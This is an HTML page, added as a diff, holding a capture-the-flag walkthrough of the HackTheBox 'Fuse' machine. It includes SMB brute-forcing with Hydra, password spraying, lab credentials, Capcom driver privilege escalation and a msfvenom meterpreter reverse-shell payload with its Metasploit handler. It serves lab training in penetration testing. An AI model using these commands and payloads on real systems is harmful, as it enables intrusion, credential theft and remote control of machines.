@@ -1,0 +1,116 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Fuse HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/fuse-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-08T11:31:28+00:00">February 8, 2021</time><time class="updated" datetime="2025-06-23T08:40:17+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Fuse. It was created by <span style="color: #0000ff;"><strong>egre55</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Crafting Dictionary for Bruteforce using CeWL</span></li>
+<li><span style="color: #000000;">Bruteforcing SMB using Hydra</span></li>
+<li><span style="color: #000000;">Connecting using RPCClient</span></li>
+<li><span style="color: #000000;">Enumerating Printer Logs</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Password Spraying using Crackmapexec</span></li>
+<li><span style="color: #000000;">Logging using Evil-WinRM</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Checking Privileges for the user</span></li>
+<li><span style="color: #000000;">Exploiting SeLoadDriver Privilege using Capcom Exploit</span></li>
+<li><span style="color: #000000;">Reading Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: 10.129.2.5</span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.2.5</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-aQDUiUL2mAI/YCEeKFT_jKI/AAAAAAAAths/qCwZ0kJ1DEEGzjAgOU8dOxW_1emk4EFegCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 53 (DNS), 80 (HTTP) 139 (SMB) and other Windows Server Services. Now it is clear that this is a Windows OS based Machine. The OS detected is Microsoft Server 2016.</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;"> We tried to access the HTTP service but we were not redirected. This means we need to add an entry in the /etc/hosts file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NIB5Tp7_ir8/YCEeQaHODaI/AAAAAAAAthw/sj0eZhk6It0e61vlQ7ET3_9WyhC0qo5JwCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">After adding the entry, we are not able to access the HTTP service. We find out that it is PaperCut Print Logger. It is free software that can log, audit and track on Windows systems and print servers. It is pretty common in a corporate environment where there want to keep track a huge array of employees and printers.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xzzJQMXy9xc/YCEeUqQrJWI/AAAAAAAAth0/8iNhQvsqA8sjkGptucWBDj-i5mNUnS-FgCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Upon inspecting different logs we see that the logs have the user section. These users must also exist on the network, so we might need these usernames for a Bruteforce.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wWePCU1Bj5U/YCEeY5PB7OI/AAAAAAAAth4/DjAozq_PiTwCa3uKhF5jS32XpfJqC9BkwCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">For performing a bruteforce, we need to create a dictionary of users first. To craft the dictionary, we used Cewl.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cewl -w pwd.txt --with-numbers http://fuse.fabricorp.local/papercut/logs/html/index.htm</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-w63kYdcYFGw/YCEeddJL97I/AAAAAAAAtiA/UFP8mc4WQeIS2ptrwToljvVpXB_n3UIrgCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">We decided to use Hydra as our bruteforcing tool. We got two successful hits. One for user tlavel and bhult. Both use the same Fabricorp01 as password. First of all that is not a secure or complex password and two employees using the same password that is unbelievable. What’s more shocking is that if this were a real corporate network, we would have about 50-60 users who would use the default or weak passwords. Hence, no matter how good your infrastructure security is, if you do not ensure that your employees follow good password practices, attackers will target you.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L users.txt -P pwd.txt 10.129.2.5 smb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WHrxMU3fbVo/YCEehjjgWYI/AAAAAAAAtiI/Wq5dd2rYGgkx8Tdy5TIUOLSteqq6w6tiQCLcBGAsYHQ/s16000/7.png"/></span></p>
+<h4><span style="color: #000000;">Gaining Initial Access</span></h4>
+<p><span style="color: #000000;">We try to login using smbclient. We first try for user tlavel. It doesn’t login but instead, it gave an error “NT_STATUS_PASSWORD_MUST_CHANGE”. It basically means that we can’t login using this password. The password must be changed for logging in. So, let’s change the password. Changing the password on SMB requires Old password and then we can set a new password of our choice.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient -L 10.129.2.5 -U tlavel
+smbpasswd -r 10.129.2.5 -U tlavel
+Fabricorp01
+Password@123987</pre>
+<p><span style="color: #000000;">.<img decoding="async" src="https://1.bp.blogspot.com/-3fOcuKEC0t0/YCEenN-doPI/AAAAAAAAtiQ/Klrhe9xTmi0rSbQWPP3Oq_I5VhffwqNJQCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">After spending enough time, we couldn’t find anything usable inside the SMB shares. This is where we decided to enumerate further using the RPC client. We use the credentials that we generated earlier. There are a bunch of enumeration scripts and commands that we can run here. But since during our initial assessment of the HTTP service, we know that Paper Cut Print Logger is installed on the Machine. It means we need to enumerate printers on the network. We will use <strong>enumprinters </strong>for this task. Here we have a password that is logged.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">rpcclient -U tlavel 10.129.2.5
+$fab@s3Rv1ce$1
+enumprinters</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jug0XCEA0fE/YCEerJHLqTI/AAAAAAAAtiY/CQd64pBzxaIvkub2qefX2Q4o8lMhwY4ZACLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">Since we know a password but not the username associated with it, We will perform, Password Spraying. Learn more about Password Spraying from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/">here</a></strong></span>. There are a bunch of tools that can be used for password spraying. We will be using Crackmapexec. After password spraying, we got to know that there is a user ‘svc-print’ that have the password </span><strong><span style="color: #000000;">$fab@s3Rv1ce$1</span></strong></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec winrm 10.129.2.5 -u users.txt -p '$fab@s3Rv1ce$1'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-grH3-5xwvgk/YCEev-vk5WI/AAAAAAAAtig/tyMTiEt7uD4CJueGmA1dOfV445k4b8gowCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Now using the newly found set of credentials and Evil-WINRM we try to login. Here, after some enumeration, we found the user flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 10.129.2.5 -u svc-print -p '$fab@s3Rv1ce$1'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1wviIgQgv4c/YCEe0ufO7UI/AAAAAAAAtio/nbCg_WIeg6oVyX2Qk_gNZ8xmxxEAzhQVwCLcBGAsYHQ/s16000/11.png"/></span></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
+<p><span style="color: #000000;">We listed the current user’s privileges in order to promote them to a higher level. It indicated that the current user’s SeLoadDrivverPrivilege is enabled. This privilege is extremely risky. It enables the user to run code with kernel privileges and load kernel drivers. To increase our privileges, we’ll be utilizing the Capcom Driver Exploit. The Capcom.sys driver file, which enables us to run arbitrary code on the machine, had to be downloaded first. Additionally, we must upload an executable file that can launch the driver sys file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Download Capcom.sys
+Download ExploitCapcom.exe
+whoami /priv
+upload /root/Downloads/Capcom.sys .
+upload /root/Downloads/ExploitCapcom.exe .</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-1hg2JKuBk8c/YCEe5Qy3haI/AAAAAAAAtiw/UzmOWjNxMGUzSGKmf7F-dBwV8olKUskeQCLcBGAsYHQ/s16000/12.png"/></strong></span></p>
+<p><span style="color: #000000;">Now, let’s test the ability of the Capcom Exploit to run commands as NT Authority System. To test, we first need to load the diver sys file using the executable.  This will check for the SeLoadDriver Privilege and then make an appropriate entry in the registry. Now, we can use the executable to run the commands as NT Authority.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\ExploitCapcom.exe LOAD C:\Users\svc-print\Documents\Capcom.sys
+.\ExploitCapcom.exe EXPLOIT whoami</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tRBskf7JMvs/YCEfBMEw1EI/AAAAAAAAti4/AW5Qn_MyP2460MozHAcsa8U2VlHsy68sACLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">To get the elevated shell, we craft a reverse_tcp payload using Msfvenom.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.52 LPORT=4444 -f exe &gt; shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TFOZw8n6t8s/YCEfIfbiwqI/AAAAAAAAtjA/30J96JFu_9wNAYK5_QgGlMlBshThOJExACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Now, we upload this crafted payload to the target system. Now before executing it, we run Metasploit to create a handler for the shell. We provide the LHOST and LPORT that we referred to in the payload. Now we execute the payload. We see that Capcom grabs a handle on memory and execute the payload using elevated privileges.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /root/Downloads/shell.exe .
+.\ExploitCapcom.exe EXPLOIT shell.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QP1T2D1kQzE/YCEfM5wZaqI/AAAAAAAAtjI/5-jSxLaxIVwIGNhwsZXSimDeq6tacO3AgCLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">We went back to our Metasploit Listener to see that it captured the session generated.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.52
+exploit
+getsystem</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bDwBxEwFxWI/YCEfR3GmPSI/AAAAAAAAtjQ/6FMd-zaPz_whU9U5Rnd5S4AsUHSHRLUgwCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">You need to read the root flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ls
+cd Administrator
+cd Desktop
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2krd_bmDS4w/YCEfWH52htI/AAAAAAAAtjU/8-fivZX8o0wtpueiGA102HiYc7yIjks_wCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
